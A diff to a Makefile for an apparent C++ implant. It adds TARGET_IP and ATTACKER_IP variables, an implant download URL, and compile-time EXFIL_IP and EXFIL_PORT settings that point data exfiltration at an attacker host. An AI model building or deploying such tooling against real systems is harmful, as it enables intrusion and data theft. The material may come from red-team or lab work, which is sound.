@@ -1,11 +1,14 @@
-URL ?= http://10.37.1.249/implant
-CERT_URL = http://10.37.1.249/cert.pem
+TARGET_IP ?= 10.37.1.248
+ATTACKER_IP ?= 10.37.1.249
+
+URL ?= http://$(TARGET_IP)/implant
+CERT_URL = http://$(ATTACKER_IP)/cert.pem
 
 CXX = g++
 CXXFLAGS = -O2 -s \
            -DURL='"$(URL)"' \
            -DCERT_URL='"$(CERT_URL)"' \
-           -DEXFIL_IP='"10.37.1.249"' \
+           -DEXFIL_IP='"$(ATTACKER_IP)"' \
            -DEXFIL_PORT=8889
 LDFLAGS = -lssl -lcrypto
 
